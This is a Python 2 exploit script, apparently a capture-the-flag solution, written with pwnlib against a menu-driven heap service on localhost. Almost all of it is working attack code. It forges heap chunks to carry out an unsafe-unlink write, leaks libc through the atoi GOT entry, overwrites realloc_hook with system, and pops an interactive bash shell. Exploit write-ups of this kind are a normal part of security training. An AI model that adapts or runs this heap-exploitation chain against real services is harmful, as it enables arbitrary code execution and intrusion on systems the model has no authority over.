from pwnlib import * 

heap_base = 0x603000

def checksafe(string):
	for c in string:
		assert ord(c) not in [
			0xa, 0x21, 0x3f, 0x40, 0x22, 0x27, 0x23, 0x25, 0x26]

def make_name(char):
	assert ord(char) in [0xa, 0x21, 0x3f, 0x40, 0x22, 0x27, 0x23, 0x25, 0x26]
	name  = "A"*0x28
	name += char
	return name

def clear():
	return s.ru("6.exit")

s = Socket(("localhost", 4442))
print clear()

def set_name(name):
	s.send("4\n")
	s.ru("ew name:\n")
	s.send(name)
	clear()

def tear(data, length, c=True):
	s.send("3\n")
	s.ru("):\n")
	s.send("%d\n" % length)
	if not c:
		return
	s.ru(" page:\n")
	s.send(data + "\n")

def edit_page(data):
	assert "\n" not in data
	s.send("2\n")
	s.ru("page:")
	s.send(data + "\n")
	clear()

def set_title(title):
	assert "\n" not in title
	s.send("5\n")
	s.ru("title:\n")
	s.send(title + "\n")
	clear()

def read_page():
	s.send("1\n")
	s.ru("you write:\n")
	r = s.ru("Welcome to")
	clear()
	return r[:-1] # remove \n

target = 0x602040

prev_chunk  = pq(1)
prev_chunk += pq(2)
prev_chunk += pq(target - 0x18) # fwd
prev_chunk += pq(target - 0x10) # bck

next_chunk  = pq(6)
next_chunk += pq(0x41)
next_chunk += pq(7)
next_chunk += pq(8)

set_name(
	prev_chunk +  	# fake prev chunk
	pq(0x20) + 		# prev_size
	"\x40"			# clear PREV_INUSE flag
)

edit_page("A"*(16 + 0x20) + next_chunk)

tear("BBBBBBBB", 0x100)
tear("CCCC", 0x100-0x40)
tear("DDDDDDDD", 0x400)

atoi_got = 0x601ff0

bss  = pq(0)
bss += pq(0x602038) # title
bss += pq(atoi_got) # page
checksafe(bss)
set_name(bss + "\n")

libc_base = uq(read_page().ljust(8, chr(0))) - 0x39f50
system = libc_base + 0x46645
realloc_hook = libc_base + 0x3be730
print "libc: 0x%x" % libc_base
assert libc_base & 0xfff == 0

bss  = pq(0x602058) # page: "bash"
bss += pq(realloc_hook) # name
bss += pq(0x400) # page_size
bss += pq(0) # num_tears
bss += "bash"
set_title(bss)

set_name(pq(system) + "\n")

tear("QQQQQ", 0x80, c=False)

print "shell?"
s.send("pwd\n")
s.interact()
